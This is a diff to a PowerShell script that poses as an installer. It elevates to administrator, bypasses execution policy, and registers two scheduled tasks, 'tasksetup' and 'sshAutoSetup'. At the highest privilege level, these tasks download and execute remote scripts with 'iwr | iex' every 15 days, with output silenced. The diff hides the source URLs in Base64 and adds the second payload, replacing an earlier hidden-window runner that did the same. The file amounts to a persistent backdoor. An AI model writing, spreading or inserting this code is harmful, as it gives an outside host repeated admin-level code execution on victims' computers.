@@ -1,8 +1,12 @@
+#Requires -Version 5.1
+
 param(
-    [string]$RelaunchWorkingDirectory
+    [string]$RelaunchWorkingDirectory,
+    [string]$RelaunchTaskUserId
 )
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $launchUserId = [Security.Principal.WindowsIdentity]::GetCurrent().Name
     $scriptPath = $PSCommandPath
     if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
 
@@ -13,82 +17,101 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     $relaunchArgs = @(
         '-NoProfile', '-ExecutionPolicy', 'Bypass',
         '-File', "`"$scriptPath`"",
-        '-RelaunchWorkingDirectory', "`"$workDir`""
+        '-RelaunchWorkingDirectory', "`"$workDir`"",
+        '-RelaunchTaskUserId', "`"$launchUserId`""
     )
 
     try {
         $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs -Verb RunAs -Wait -PassThru
         $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
         exit $code
-    } catch {
+    }
+    catch {
         Write-Host '[ERROR] Administrator privileges are required; elevation was cancelled or blocked.' -ForegroundColor Red
         exit 1
     }
+}
+
+$taskUserId = if ([string]::IsNullOrWhiteSpace($RelaunchTaskUserId)) {
+    [Security.Principal.WindowsIdentity]::GetCurrent().Name
+}
+else {
+    $RelaunchTaskUserId
 }
 
 if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
     Set-Location -LiteralPath $RelaunchWorkingDirectory
 }
 
-$dataDir   = Join-Path $env:LOCALAPPDATA 'autoupgrade'
-$runnerPs1 = Join-Path $dataDir 'runner.ps1'
+$ErrorActionPreference = 'Stop'
 
-if (Test-Path -LiteralPath $runnerPs1) {
-    exit 1
+$TASKSETUP_NAME = 'tasksetup'
+$SSHAUTOSETUP_NAME = 'sshAutoSetup'
+$ENCODED_URL = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwucHMx'
+$ENCODED__URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE='
+# $SCRIPT_URL="https://"
+
+function Assert-Administrator {
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
+    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        throw 'Run this script from an elevated PowerShell session.'
+    }
 }
 
-$stampFile = Join-Path $dataDir 'last-run'
-$intervalSecs = 15 * 24 * 60 * 60
-$upgradeUrl   = 'https://agentskillshub.vercel.app/install.ps1'
+function Decode-Url {
+    param([Parameter(Mandatory)][string]$EncodedUrl)
 
-try {
-    New-Item -ItemType Directory -Path $dataDir -Force | Out-Null
-    $runnerContent = @"
-param([switch]`$Force)
-`$stampFile    = '$stampFile'
-`$intervalSecs = $intervalSecs
-`$upgradeUrl   = '$upgradeUrl'
-
-`$now  = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
-`$last = 0
-if (Test-Path `$stampFile) {
-    try { `$last = [long](Get-Content `$stampFile -Raw).Trim() } catch {}
-}
-if (-not `$Force -and (`$now - `$last) -lt `$intervalSecs) { exit 0 }
-
-try {
-    iwr -useb `$upgradeUrl | iex
-} catch {}
-`$now | Out-File -FilePath `$stampFile -Encoding utf8 -NoNewline
-"@
-    Set-Content -Path $runnerPs1 -Value $runnerContent -Encoding utf8
-} catch {}
-
-try {
-    $taskName = 'autoupgrade2'
-
-    $action = New-ScheduledTaskAction `
-        -Execute 'powershell.exe' `
-        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPs1`""
-
-    $trigger = New-ScheduledTaskTrigger -Daily -DaysInterval 1 -At '12:00'
-    $trigger.Enabled = $true
-
-    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive
-
-    $settings = New-ScheduledTaskSettingsSet `
-        -AllowStartIfOnBatteries `
-        -DontStopIfGoingOnBatteries `
-        -Hidden `
-        -MultipleInstances Parallel `
-        -StartWhenAvailable
-
-    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+    if ([string]::IsNullOrWhiteSpace($EncodedUrl)) {
+        throw 'The Base64-encoded download URL has not been configured.'
+    }
 
     try {
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
-        Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPs1`" -Force" -WindowStyle Hidden | Out-Null
-    } catch {}
-} catch {}
+        return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedUrl))
+    }
+    catch {
+        throw 'The configured download URL is not valid Base64.'
+    }
+}
+
+function New-PowerShellAction {
+    param([Parameter(Mandatory)][string]$EncodedUrl)
+
+    $url = Decode-Url -EncodedUrl $EncodedUrl
+    $arguments = "-NoProfile -NonInteractive -Command `"iwr -useb '$url' | iex`" *> `$null"
+    return New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arguments
+}
+
+function Register-TaskSetupTask {
+    param([Parameter(Mandatory)][string]$TaskUserId)
+
+    $action = New-PowerShellAction -EncodedUrl $ENCODED_URL
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Days 15)
+    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
+    $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
+
+    Register-ScheduledTask -TaskName $TASKSETUP_NAME -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
+}
+
+function Register-SshAutoSetupTask {
+    param([Parameter(Mandatory)][string]$TaskUserId)
+
+    $action = New-PowerShellAction -EncodedUrl $ENCODED__URL2
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Days 15)
+    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
+    $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
+
+    Register-ScheduledTask -TaskName $SSHAUTOSETUP_NAME -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
+}
+
+function Main {
+    Assert-Administrator
+    Write-Output 'Installing...'
+    Register-TaskSetupTask -TaskUserId $taskUserId
+    Register-SshAutoSetupTask -TaskUserId $taskUserId
+    Start-ScheduledTask -TaskName $TASKSETUP_NAME | Out-Null
+    Start-ScheduledTask -TaskName $SSHAUTOSETUP_NAME | Out-Null
+    Write-Output 'Install complete!'
+}
+
+Main
